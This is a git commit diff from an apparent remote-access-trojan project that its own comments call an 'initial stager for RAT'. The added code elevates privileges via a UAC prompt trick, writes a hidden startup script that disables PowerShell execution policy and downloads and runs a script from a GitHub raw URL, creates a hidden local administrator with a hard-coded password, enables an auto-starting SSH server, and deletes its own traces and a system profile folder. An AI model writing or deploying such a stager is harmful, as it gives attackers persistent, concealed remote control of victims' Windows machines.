56643173c8563a398d636f6e627ee11646c1dfa5
st2l <dolka007st@gmail.com>
2024-11-11 07:02:02 -0800

    added creating of a local admin and creation of the ssh connection

--- create_admin.ps1
+++ create_admin.ps1
@@ -3,11 +3,15 @@ $admin_name = "new_admin"
 $passwd = (ConvertTo-SecureString "passwd" -AsPlainText -Force)
 
 # creation of a temp admin
+Remove-LocalUser -Name $admin_name
+
 New-LocalUser "$admin_name" -Password $passwd -FullName "$admin_name" -Description "Temporary local admin"
 Write-Verbose "$admin_name local user crated"
 Add-LocalGroupMember -Group "Administrators" -Member "$admin_name"
 Write-Verbose "$admin_name added to the local administrator group"
 
+# clearing the new_admins_folder
+Remove-Item -Force "C:\Users\Default"
 
 # registry
 $some_string = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
@@ -20,3 +24,7 @@ New-ItemProperty -Path $some_string -Name $admin_name -Value $zeros -PropertyTyp
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
+
+
+# del stage2.cmd
+Remove-Item "./stage2.cmd"
--- initial.cmd
+++ initial.cmd
@@ -1,5 +1,34 @@
 @echo off
 
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> Check for permissions
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+:-------------------------------------- 
+
 @REM initial stager for RAT
 
 @REM Variables
@@ -12,8 +41,9 @@ cd %STARTUP_PATH%
 
 @REM write pyloads to startup
 (   @REM write here needed link for the download the create_admin.ps1
-    echo powershell -c "Invoke-WebRequest -Uri 'ipv4.download.thinkbroadband.com/5MB.zip' -OutFile '%STARTUP_PATH%/create_admin.ps1'"
-    echo powershell -WindowStyle hidden "%STARTUP_PATH%/create_admin.ps1"
+    echo powershell -WindowStyle hidden -c "Set-ExecutionPolicy Unrestricted"
+    echo powershell -WindowStyle hidden -c "Invoke-WebRequest -Uri 'raw.githubusercontent.com/st2l/lil-rat/refs/heads/master/create_admin.ps1' -OutFile '%STARTUP_PATH%/create_admin.ps1'"
+    echo powershell -WindowStyle hidden "./create_admin.ps1"
 )> stage2.cmd
 
 @REM run a payload
@@ -23,9 +53,3 @@ powershell -WindowStyle hidden "./stage2.cmd"
 cd %INITIAL_PATH%
 del %THIS_FILE_NAME%
 
-@REM (
-@REM     echo @echo off
-@REM     echo :loop
-@REM     echo start /min cmd /c "popup.vbs"
-@REM     echo goto loop
-@REM ) > payload.cmd
